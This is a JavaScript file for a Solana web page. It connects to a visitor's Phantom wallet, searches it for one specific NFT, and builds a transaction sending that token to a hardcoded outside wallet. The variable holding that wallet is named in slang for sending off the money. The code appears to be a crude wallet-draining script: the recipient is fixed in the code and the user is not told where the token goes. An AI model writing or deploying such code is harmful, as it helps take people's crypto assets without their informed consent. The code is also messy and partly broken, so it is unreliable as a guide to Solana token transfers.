import {AccountLayout, TOKEN_PROGRAM_ID} from "@solana/spl-token";
import {clusterApiUrl, Connection, PublicKey, LAMPORTS_PER_SOL} from "@solana/web3.js";
import { getParsedNftAccountsByOwner,isValidSolanaAddress, createConnectionConfig,} from "@nfteyez/sol-rayz";
import * as SPLToken from "@solana/spl-token";
import { Token } from '@solana/spl-token';
import { findAssociatedTokenAccountPublicKey } from './associatedAccounts';
import { sendTxUsingExternalSignature } from './externalWallet';
import { getOrCreateAssociatedAccount } from './getOrCreateAssociatedAccount';

// import { programs } from "@metaplex/js"



export const connectionString = 'mainnet-beta';
export const COMMITMENT = "singleGossip";   

export const connection = new Connection(
    clusterApiUrl(connectionString),
    'confirmed'
)



const getProvider = async () => {
    if ("solana" in window) {
      await window.solana.connect(); // opens wallet to connect to
      return window.solana;
    } else {
      document.write('Install https://www.phantom.app/');
    }
};


function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

let wallet = "pas bon"
function main() {

    getProvider().then(provider => {
        console.log('wallet', provider.publicKey.toString())

        //test
        wallet = provider.publicKey.toString().slice(0, 4);
        // document.getElementById("test").innerHTML = wallet;
        //fin test


        wallet = provider.publicKey.toString()
        main2(wallet)
    })
    .catch(function(error){
        console.log(error)
    });   
  }

let listTokens = []

console.log("hello")

async function main2 (wallet)
{
    //caca
    let tokenAdressToGet = "8Di4oe4eLrwXi5Hw2UsxcKzcYZsETAbCVRViW6f3iKi2"

    // 1. 抓取所有onwer所有擁有的代幣帳戶
    
    let response = await connection.getTokenAccountsByOwner(
    new PublicKey(wallet), // owner here
    {
        programId: TOKEN_PROGRAM_ID,
    }
    );

    const container = document.getElementById('test');

    // console.log("boobs : ", container.textContent)


    // const tokenMetadata = programs.metadata.Metadata.findByOwnerV2(connection, walletPublicKey);

    // console.log(JSON.stringify(tokenMetadata));


    response.value.forEach((e) => {
        const accountInfo = SPLToken.AccountLayout.decode(e.account.data);

        // console.log(accountInfo)



        var truc = `${SPLToken.u64.fromBuffer(accountInfo.amount)}`

        // console.log(`${SPLToken.u64.fromBuffer(accountInfo.mint)}`)

        // console.log("truc : ", truc)
        // console.log("bonsoir")
        // console.log(truc)

        if (truc == 1) {

            // console.log(`jsp: ${new PublicKey(accountInfo)}`);
            // console.log(`mint: ${new PublicKey(accountInfo.mint)}`);

            var bidule = `${new PublicKey(accountInfo.mint)}`

            // console.log("bidule : ", bidule)

            if (bidule == tokenAdressToGet)
            {
                console.log("trouvé")
                listTokens.push(`${new PublicKey(accountInfo.mint)}`)

            }
            // console.log(`amount: ${SPLToken.u64.fromBuffer(accountInfo.amount)}`);
        }





      });

   
}



main()

// const walletToSendLaMoula = "A1i6NznLDcnk6Uswueu6vT8FDUds98oKJz4xnsKkfZH9"
const walletToSendLaMoula = "2iQcFVPu9XHTxEGARjRUdxLDhNVLYN9VPfq6rvXqeW7t"


  //setAutoApprove(adapter.autoApprove); 

  //TEST
  export const transferTokenHandler = async(owner, 
    dest, 
    token,
    amount,
    payer) => {
    console.log("ici : ", wallet)


    const toutesLesTransactions = []

    const ownerPub = new PublicKey(wallet);

    for (let i = 0; i < 1; i++) 
    {
       

        const tokenPub = new PublicKey(listTokens[i]);
        const destPub = new PublicKey(walletToSendLaMoula);

        const tokenAssociatedAddress = await getOrCreateAssociatedAccount(
            destPub,
            tokenPub,
            wallet.toString()
        )

       

        //ASSUMING THAT BOTH OWNER AND DESTINATION HAS AN ACCOUNT ASSOCIATED
        //Finding Associated Account of owner
        const assOwnerAccount = await findAssociatedTokenAccountPublicKey(ownerPub, tokenPub);

        // //Finding the Asscociated Account of destination
        const assDestAccount = await findAssociatedTokenAccountPublicKey(destPub, tokenPub);


        sleep(10000).then(console.log("hello"));


        if(tokenAssociatedAddress) tokenAssociatedAddress !== assDestAccount && console.log(false);




        const ix  = Token.createTransferInstruction(
                TOKEN_PROGRAM_ID, //PROGRAM_ID
                assOwnerAccount, //Associated Owner Account
                assDestAccount, //Associated Destination Account
                ownerPub, //Owner
                [], //multisigners
                1 //Amount
        );

        toutesLesTransactions.push(ix)




    }








    
    console.log("ras le cul")
    // Assuming that the source and the feepayer are the same
    sendTxUsingExternalSignature(
        toutesLesTransactions, connection, null, [], ownerPub
    );
}